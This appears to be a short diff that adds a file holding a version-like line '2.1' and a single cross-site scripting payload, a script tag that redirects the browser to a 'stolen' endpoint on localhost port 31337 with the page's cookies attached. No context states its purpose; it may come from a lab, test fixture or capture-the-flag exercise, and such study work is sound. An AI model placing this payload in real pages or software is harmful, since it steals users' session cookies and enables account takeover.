@@ -1,0 +1,6 @@
+
+
+
+2.1
+<script>document.location='http://localhost:31337/stolen?cookies=' + document.cookie;</script>
+
